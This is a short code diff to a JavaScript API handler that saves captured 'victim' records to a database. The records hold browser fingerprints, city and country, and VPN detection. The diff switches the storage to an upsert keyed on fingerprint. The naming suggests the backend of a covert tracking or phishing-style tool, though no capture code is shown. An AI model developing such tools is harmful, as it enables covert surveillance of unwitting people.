@@ -317,35 +317,34 @@ export default async function handler(req, res) {
       },
     };
 
-    // Save to database
+    // Save to database (upsert: insert if new, update if exists)
     const collection = await getVictimsCollection();
     await ensureIndexes(collection);
 
-    const result = await collection.insertOne(victimData);
+    // Use updateOne with upsert to either insert new or update existing
+    const result = await collection.updateOne(
+      { fingerprint }, // Find by fingerprint
+      { $set: victimData }, // Update with new data
+      { upsert: true } // Insert if doesn't exist
+    );
+
+    const isUpdate = result.matchedCount > 0;
 
     // Return success response
     return res.status(200).json({
       success: true,
-      message: 'Data captured successfully',
+      message: isUpdate ? 'Data updated successfully' : 'Data captured successfully',
       fingerprint,
       location: {
         city: location.city,
         country: location.country_name,
       },
       vpnDetection,
-      insertedId: result.insertedId,
+      isUpdate,
+      upsertedId: result.upsertedId,
     });
   } catch (error) {
     console.error('Capture error:', error);
-
-    // Handle duplicate fingerprint
-    if (error.code === 11000) {
-      return res.status(200).json({
-        success: true,
-        message: 'Data already captured',
-        duplicate: true,
-      });
-    }
 
     return res.status(500).json({
       error: 'Internal server error',
